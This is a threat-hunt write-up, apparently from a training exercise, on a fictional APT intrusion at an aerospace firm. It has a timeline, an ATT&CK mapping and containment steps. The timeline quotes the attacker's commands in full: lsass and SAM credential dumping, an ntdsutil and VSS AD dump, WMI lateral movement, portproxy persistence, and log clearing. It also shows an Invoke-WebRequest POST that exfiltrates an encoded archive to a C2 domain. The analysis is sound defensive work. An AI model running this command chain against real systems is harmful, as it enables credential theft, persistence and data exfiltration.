![Threat Hunt Silent Corridor web banner](assets/silent_corridor_banner.png)
# Operation Silent Corridor
**Threat Actor:** GREY VEIL // State-Sponsored // Defence Sector APT  
**Environment:** Microsoft Sentinel — LAW-SilentCorridor (`SilentCorridorX_CL`)  
**Hunt Window:** 20 February – 5 March 2026  
**Organisation:** Haldric Aerospace // Engineering Segment  
**Analyst:** Katie aka ktx0r

## Executive Summary

Good news: GREY VEIL was here. Bad news: they'd been here since February. A compromised VPN account was the welcome mat, a stolen domain credential was the skeleton key — together they touched three hosts, dumped the Active Directory database, grabbed A400M navigation system files, wrapped them in a fake Windows update zip, and sent them home. They also left portproxy tunnels burned into the registry on two hosts, so resetting passwords alone won't fix anything.

## Key Intelligence

| Item | Value |
|---|---|
| Compromised accounts | `s.brandt`, `m.richter` |
| Attacker external IP | `185.220.101.34` |
| Legitimate s.brandt IP | `88.153.72.14` |
| Attacker tunnel IP | `10.1.96.114` |
| Beachhead host | `WS-ENG04` (10.1.36.210) |
| Stolen credentials | `m.richter` / `Haldric2025SecIT` |
| Domain controller | `SRV-DC01` (10.1.31.206) |
| File server | `SRV-FILES02` (10.1.70.42) |
| C2 domain | `cdn-telemetry.cloud-endpoint.net` |
| Targeted data | `C:\Engineering\Avionics\A400M_NavSys\` |
| Exfil file | `win_update_kb5034.zip` → `win_update_kb5034.b64` |

## Attack Timeline

| Timestamp | Host | Account | Activity |
|---|---|---|---|
| Feb 20 02:14 | WS-ENG04 | s.brandt | First attacker VPN login from 185.220.101.34. TunnelIP 10.1.96.114 assigned. Immediate `systeminfo` recon via cmd.exe. |
| Feb 23 01:47 | WS-ENG04 | s.brandt | AD enumeration — `net group "Domain Admins"`, `net group "Enterprise Admins"` |
| Feb 23 01:49 | WS-ENG04 | s.brandt | Disk enumeration via `wmic logicaldisk` |
| Feb 23 11:01 | WS-ENG04 | s.brandt | Log clearing — `wevtutil cl Security` |
| Feb 24 | WS-ENG04 | s.brandt | PowerShell pipe connection (SysmonEvent26), `CreateRemoteThreadApiCall` via cmd.exe |
| Feb 24 12:53 | SRV-DC01 | s.brandt | First lateral movement to domain controller |
| Feb 25 07:27 | SRV-FILES02 | s.brandt | First lateral movement to file server |
| Feb 26 02:38 | WS-ENG04 | s.brandt | `tasklist /fi "imagename eq lsass.exe"` — locating lsass PID |
| Feb 26 02:40 | WS-ENG04 | s.brandt | `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full` — **dump failed, no file created** |
| Feb 26 02:42 | WS-ENG04 | s.brandt | `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"` — PuTTY credential harvest |
| Feb 27 12:20 | WS-ENG04 | s.brandt | `reg save HKLM\SAM C:\Windows\Temp\...` — SAM hive export (fallback after failed lsass dump) |
| Feb 27 11:04 | WS-ENG04 | s.brandt | `cmdkey /list` — Windows Credential Manager enumeration |
| Feb 28 03:15 | WS-ENG04 | s.brandt | First authenticated lateral pivot: `net use \\SRV-DC01\C$ /user:m.richter Haldric2025SecIT` |
| Feb 28 03:15 | WS-ENG04 | s.brandt | `wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create "cmd.exe /c ..."` |
| Feb 28 03:25 | WS-ENG04 | s.brandt | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` |
| Feb 28 03:33 | SRV-FILES02 | m.richter | `wevtutil cl Security` — log clearing via remote WMI |
| Feb 28 03:47 | WS-ENG04 | s.brandt | Remote WMI log clearing on SRV-FILES02 and SRV-DC01 |
| Feb 28 04:18 | SRV-DC01 | m.richter | `ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs" q q` — full AD database dump |
| Feb 28 04:20 | SRV-DC01 | m.richter | `vssadmin create shadow /for=C:` — VSS snapshot to access locked ntds.dit |
| Feb 28 04:23 | SRV-DC01 | m.richter | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp` |
| Feb 28 04:45 | SRV-DC01 | m.richter | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` — staging cleanup |
| Feb 28 03:18 | SRV-FILES02 | m.richter | `powershell Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip'` |
| Feb 28 03:19 | SRV-FILES02 | m.richter | `certutil -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64` |
| Mar 02 01:19 | WS-ENG04 | s.brandt | `powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing` — **exfiltration** |
| Mar 04 02:45 | WS-ENG04 | s.brandt | `certutil -urlcache -split -f "https://cdn-telemetry.cloud-endpoint.net" C:\Windows\Temp\response.txt` — C2 callback |
| Mar 05 03:05 | WS-ENG04 | s.brandt | Attacker returns via VPN from 185.220.101.34 |

## ATT&CK Mapping

| Tactic | Technique | Detail |
|---|---|---|
| Initial Access | T1078 — Valid Accounts | VPN access via compromised s.brandt credentials |
| Discovery | T1082 — System Information Discovery | `systeminfo.exe` on beachhead |
| Discovery | T1069 — Permission Groups Discovery | `net group` AD enumeration |
| Credential Access | T1003.001 — LSASS Memory | `rundll32 comsvcs.dll MiniDump` — blocked |
| Credential Access | T1003.002 — SAM | `reg save HKLM\SAM` |
| Credential Access | T1552.001 — Credentials in Files | PuTTY session registry harvest |
| Credential Access | T1555 — Credentials from Password Stores | `cmdkey /list` |
| Credential Access | T1003.003 — NTDS | `ntdsutil ifm` + VSS snapshot |
| Lateral Movement | T1021.002 — SMB/Windows Admin Shares | `net use \\SRV-DC01\C$` with m.richter |
| Lateral Movement | T1047 — WMI | `wmic /node` remote execution |
| Collection | T1560.001 — Archive via Utility | `Compress-Archive` on A400M_NavSys |
| Exfiltration | T1048.003 — Exfil Over HTTPS | `Invoke-WebRequest` POST to C2 |
| Defense Evasion | T1070.001 — Clear Windows Event Logs | `wevtutil cl Security` on all three hosts |
| Defense Evasion | T1027 — Obfuscated Files | `certutil -encode` base64 conversion |
| Defense Evasion | T1036 — Masquerading | Staging dir named `McAfee_Logs`, exfil file named `win_update_kb5034` |
| Command & Control | T1090.001 — Port Proxy | `netsh portproxy` on WS-ENG04 and SRV-DC01 |
| Persistence | T1090.001 — Port Proxy (registry) | Portproxy rules persist in HKLM registry across reboots and credential resets |

## Credential Theft Chain

The attacker's primary lsass dump attempt on Feb 26 **failed** — `sys_diag.dmp` was never created on disk, no DLL load recorded, no Defender event fired. Silent failure. They pivoted immediately to alternative credential sources:

1. PuTTY session registry query — `HKCU\Software\SimonTatham\PuTTY\Sessions`
2. SAM hive export — `reg save HKLM\SAM`
3. Windows Credential Manager — `cmdkey /list`
4. Full NTDS dump via ntdsutil + VSS on SRV-DC01 (using already-obtained m.richter credentials)

m.richter credentials (`Haldric2025SecIT`) were obtained via one of these methods and used for all subsequent lateral movement and privileged operations.

## Persistence Mechanism

Two portproxy tunnels were installed and written to the registry:

**WS-ENG04** (installed Feb 28 03:25 by s.brandt):
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local
```

**SRV-DC01** (installed Feb 28 04:23 by m.richter):
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp
```

Both rules persist in `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp` and survive password resets. Removing them requires explicit `netsh interface portproxy delete` or registry cleanup.

## Exfiltration Chain

```
C:\Engineering\Avionics\A400M_NavSys\*
  → Compress-Archive → win_update_kb5034.zip
  → certutil -encode  → win_update_kb5034.b64
  → Invoke-WebRequest POST → cdn-telemetry.cloud-endpoint.net
```

**Confidence: HIGH.** Full chain observed in process telemetry. File creation confirmed in DeviceFileEvents. Network destination matches C2 domain used in Mar 04 certutil callback.

## Detection Notes

- **Surviving log source:** Sysmon/MDE telemetry forwarded to Sentinel. The attacker cleared Windows Security logs on all three hosts via `wevtutil cl Security` but did not touch Sysmon. Every finding in this hunt came from MDE process, file, network, registry, and logon telemetry — none of it from Windows Event Log.
- **MsMpEng.exe** accessed the staged ntds.dit and SYSTEM files concurrently with creation — Defender saw it and did not act. Policy gap noted.
- GREY VEIL deployed no custom tooling. Every technique used a living-off-the-land binary. No signatures fired during the entire intrusion lifecycle.

## Containment Actions

1. **Disable s.brandt and m.richter** — both accounts are fully compromised
2. **Isolate WS-ENG04** — beachhead, portproxy installed, exfil originated here
3. **Remove portproxy rules** on WS-ENG04 and SRV-DC01 before credential resets
4. **Rotate all domain credentials** — ntds.dit was successfully dumped; assume full domain compromise
5. **Block 185.220.101.34** and **cdn-telemetry.cloud-endpoint.net** at perimeter
6. **Audit VSS snapshots** on SRV-DC01 and delete attacker-created shadow copies
7. **Review MDE policy** — Defender observed ntds.dit staging and did not alert

## Data Sources Used

| MdeTable | Used For |
|---|---|
| FortiGateVPN | Initial access, tunnel IP attribution, attacker vs legitimate session differentiation |
| DeviceProcessEvents | Full attack chain reconstruction across all hosts |
| DeviceFileEvents | Staging confirmation, ntds.dit creation, exfil file creation |
| DeviceRegistryEvents | SAM export, portproxy persistence confirmation |
| DeviceLogonEvents | Lateral movement scope, m.richter authentication trail |
| DeviceNetworkEvents | C2 identification, host IP mapping |
